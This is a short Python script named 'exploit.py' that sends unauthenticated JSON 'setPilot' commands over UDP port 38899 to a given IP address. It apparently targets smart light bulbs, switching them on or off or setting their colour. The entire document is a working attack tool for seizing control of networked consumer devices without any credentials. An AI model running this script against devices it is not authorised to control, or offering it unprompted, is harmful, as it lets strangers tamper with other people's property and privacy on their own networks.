import socket
import time
import random
import sys

help = """
exploit.py [IP] [on/off/r] [g] [b]
"""
if len(sys.argv) < 3:
      print(help)
      exit()
IP = sys.argv[1]
      
on = """{"params":{"orig":"andr","state":true},"id":6,"method":"setPilot"}"""
off = """{"params":{"orig":"andr","state":false},"id":6,"method":"setPilot"}"""

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((IP, 38899))
if sys.argv[2] != "on" and sys.argv[2] != "off":
    print("Changing lights color")
    r = sys.argv[2]
    g = sys.argv[3]
    b = sys.argv[4]
    color_send = """{"method":"setPilot","params":{"r":""" + str(r) + ""","g":""" + str(g)  + ""","b":""" + str(b) + ""","dimming":50}}"""
    print(color_send)
    s.sendall(bytes(color_send, "utf-8"))
    s.close()
elif sys.argv[2] == "on":
       print("Turning on the lights")
       s.sendall(bytes(on, "utf-8"))
       s.close()
elif sys.argv[2] == "off":
     print("Turning off the lights")
     s.sendall(bytes(off, "utf-8"))
     s.close()



